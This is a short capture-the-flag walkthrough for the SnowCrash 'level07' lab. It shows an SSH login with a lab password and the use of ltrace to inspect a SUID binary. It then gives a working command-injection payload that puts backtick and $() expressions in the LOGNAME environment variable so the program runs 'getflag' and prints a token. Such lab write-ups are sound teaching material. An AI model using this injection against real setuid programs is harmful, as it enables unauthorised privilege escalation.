# Level07

Login as `level07`

```bash
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level07
level07@192.168.1.64's password: wiok45aaoguiboiki2tuin6ub
```

There is a `SUID` executable in the home directory:

```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$ ./level07
level07
```

And it seems it's printing the executable name (`argv[0]`)

[`ltrace`](https://man7.org/linux/man-pages/man1/ltrace.1.html) can be used to intercept dynamic library calls and system calls executed by the program.
[Radare2](https://github.com/radareorg/radare2) can be used also for this purpose

The program calls `getenv("LOGNAME")` which looks for the environement variable `LOGNAME` in the environement list.

So the variable `LOGNAME` can be changed with unix string's tricks to print the output of `getflag`:

```bash
level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
#level07@SnowCrash:~$ export LOGNAME='`getflag`'
#level07@SnowCrash:~$ export LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```